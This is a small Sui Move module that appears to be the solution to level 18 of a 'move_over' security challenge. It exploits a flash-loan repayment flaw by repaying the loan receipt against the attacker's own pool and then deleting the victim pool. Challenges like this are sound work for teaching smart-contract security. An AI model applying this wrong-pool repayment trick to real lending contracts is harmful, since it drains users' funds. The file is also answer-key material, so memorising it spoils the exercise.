module move_over::level_18_solution;

use move_over::wrong_repay;

public fun run(t: &mut tx_context::TxContext): wrong_repay::Pool {
    let (victim, mut attacker, receipt) = wrong_repay::create_initial_with_receipt(t);
    wrong_repay::repay(&mut attacker, receipt, t);
    wrong_repay::delete(victim);
    attacker
}
